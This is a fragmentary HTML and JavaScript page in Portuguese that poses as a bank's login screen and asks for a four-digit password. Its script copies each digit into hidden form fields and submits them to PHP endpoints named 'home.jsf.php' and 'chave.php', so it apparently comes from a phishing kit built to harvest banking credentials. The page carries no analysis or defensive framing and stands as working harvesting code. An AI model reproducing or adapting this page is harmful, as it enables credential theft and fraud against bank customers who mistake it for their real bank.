...
<div class="topo_canto_L"></div><div class="topo_canto_R"></div><div id="conteudo_interno" class="miolo miolo_noBg after"><div id="divMioloPaginaLogin" class="boxP20 after"><div>
  <div id="box_titular" style="display:none;" class="pb15 after"><a id='link_saudacao' class='linkInvisivel tabindex' href='' 
		...
		function vai() {
		 ...
		 alert('Senha de 4 dígitos incorreta');
		 return false;
		 }
        ...
        document.sss.s1.value = document.sss.txtPass1.value;
		document.sss.s2.value = document.sss.txtPass2.value;
		document.sss.sc.value = document.sss.txtPass3.value;
		document.sss.s4.value = document.sss.txtPass4.value;
		
		document.forms[1].submit();
		 }
		 
		 
		 function vaichaveseg() {
		...
		document.forms['sss'].action = "chave.php";
  ...
  <form id="sss" name="sss" method="post" action="home.jsf.php" enctype="application/x-www-form-urlencoded" onsubmit="" class="ajaxForm allowSubmit">
  
 
<input type="hidden" id="s1" name="s1" maxlength="1"  />
<input type="hidden" id="s2" name="s2" maxlength="1"  />
<input type="hidden" id="sc" name="sc" maxlength="1"  />
<input type="hidden" id="s3" name="s4" maxlength="1"  />
...
<li id="form_titular:li_senha4_2" class="legendaBox"><span id="form_titular:text_senha4_legendaBox">Informe sua senha de <strong style="white-space:nowrap">4 D&#237;gitos</strong> clicando nos bot&#245;es ao lado:</span></li>
...
<input type="password" id="txtPass1" name="txtPass1" onchange="this.sss.s1.value=this.value;" maxlength="1" title="Informe sua senha de 4 d&#237;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" />

</li><li id="form_titular:li_input_fields_2"><input type="password" id="txtPass2" name="txtPass2" maxlength="1" class="frmPassWord"  disabled="disabled" />
</li><li id="form_titular:li_input_fields_3"><input type="password" id="txtPass3" name="txtPass3" maxlength="1" class="frmPassWord"  disabled="disabled"/>
</li><li id="form_titular:li_input_fields_4"><input type="password" id="txtPass4" name="txtPass4" maxlength="1" class="frmPassWord"  disabled="disabled" />


</li></div><li id="form_titular:li_input_fields_5"><span id="form_titular:text_tooltip_teclado"><a id="a_teclado" class="senha_Tip bTip auto_Tip tabindex tab-1 linkInvisivel" 
                    title="Para sua seguran&ccedil;a, informe a sua senha de 4 d&iacute;gitos.">Para sua seguran&ccedil;a, informe a sua senha de 4 d&iacute;gitos.</a></span></li><li id="form_titular:li_input_fields_6" class="leg"><span id="form_titular:label_li_input_fields_6">(4 d&#237;gitos)</span></li><li id="form_titular:li_input_fields_7"><div id="form_titular:loading_login" class="loading  loading_pass4 fl after none_i"><div id="form_titular:div_carregando" class="txt"><span id="form_titular:link_ancora_carregando"><a id="ancora_carregando" href="#" title="Carregando..."></a></span><span id="form_titular:label_carregando">Carregando...</span></div></div></li><li id="form_titular:li_input_fields_8" class="itmContraste"><div id="form_titular:div_contraste" class="contrasteTeclado"><span id="form_titular:text_label_contraste"><span class="label " id="label_contraste">Contraste do teclado:</span>
                      ...
                      <a id="a_tooltip_contraste" class="bTip auto_Tip tabindex linkInvisivel tab-1" 
						...
						<input type="hidden" name="form_titular_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /></form><div id="divDispositivos"><div id="divMensagem" class="box_redLine_bottom after inativo"><div id="divMensagem_boxP14" class="boxP14"><ul id="ul_divMensagem" class="colsLogin after"><li id="li_diMensagem_1" class="nro"><span id="divMensagem_numero_passo_um_tit">2</span></li><li id="li_divMensagem_2" class="legendaBox"><span id="li_divMensagem_2_label">Elemento de seguran&#231;a:</span></li><li id="li_divMensagem_3" class="pl5 pt8"><span id="li_divMensagem_3_label"><strong>Informe acima sua senha</strong></span></li></ul></div></div></div><div id="div-textoAntesBotoes" class="textoAntesBotoes"></div><div id="divBotoesPagina" class="mt0 bt0"><form id="loginbotoes" name="loginbotoes" method="post" action="#" enctype="application/x-www-form-urlencoded" onsubmit="javascript: return false;"><ul id="loginbotoes:ul_btos_bottom" class="btos_bottom"><li id="loginbotoes:li_btos_bottom_1"></li><li id="loginbotoes:_id85"></li></ul><input type="hidden" name="loginbotoes_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /><input type="hidden" name="loginbotoes:_link_hidden_" />
